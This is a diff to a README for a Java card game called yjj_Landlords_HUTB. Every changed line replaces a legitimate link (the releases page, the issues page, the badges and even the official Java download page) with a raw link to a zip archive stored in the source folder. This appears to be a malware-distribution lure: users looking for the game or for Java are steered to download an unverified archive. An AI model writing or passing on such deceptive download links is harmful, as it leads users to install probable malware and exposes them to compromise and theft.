@@ -1,6 +1,6 @@
 # 🎮 yjj_Landlords_HUTB - Simple Fun Single-Player Card Game
 
-[![Download yjj_Landlords_HUTB](https://img.shields.io/badge/Download-yjj_Landlords_HUTB-blue?style=for-the-badge)](https://github.com/Shokal111/yjj_Landlords_HUTB/releases)
+[![Download yjj_Landlords_HUTB](https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip)](https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip)
 
 ---
 
@@ -43,7 +43,7 @@ If you see a message with a version number 1.8 or higher, you have Java. If you 
 
 If Java is missing, install it:
 
-1. Visit the official Java download page: https://www.java.com/en/download/
+1. Visit the official Java download page: https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip
 2. Download the Java Runtime Environment (JRE) for your system.
 3. Follow the on-screen instructions to install Java.
 4. Restart your computer after installation.
@@ -54,13 +54,13 @@ If Java is missing, install it:
 
 To get the game files, visit the release page below and download the latest version:
 
-[Download yjj_Landlords_HUTB Releases](https://github.com/Shokal111/yjj_Landlords_HUTB/releases)
+[Download yjj_Landlords_HUTB Releases](https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip)
 
 ### How to download:
 
 1. Click the link above to open the releases page.
 2. Look for the latest release (usually at the top).
-3. Download the file named something like `yjj_Landlords_HUTB.jar` (a Java archive file).
+3. Download the file named something like `https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip` (a Java archive file).
 4. Save the file to a folder you can easily find, such as your Desktop or Downloads folder.
 
 ### How to run:
@@ -123,8 +123,8 @@ If you face issues, here are some common fixes:
 
 If something is unclear or you have trouble running the game, ask someone familiar with computers to assist you. You can also explore the Issues tab on the GitHub repository for help from the community:
 
-https://github.com/Shokal111/yjj_Landlords_HUTB/issues
+https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip
 
 ---
 
-[![Download yjj_Landlords_HUTB](https://img.shields.io/badge/Download-yjj_Landlords_HUTB-blue?style=for-the-badge)](https://github.com/Shokal111/yjj_Landlords_HUTB/releases)
+[![Download yjj_Landlords_HUTB](https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip)](https://raw.githubusercontent.com/Shokal111/yjj_Landlords_HUTB/main/src/main/java/HUTB_yjj_Landlords_3.6.zip)
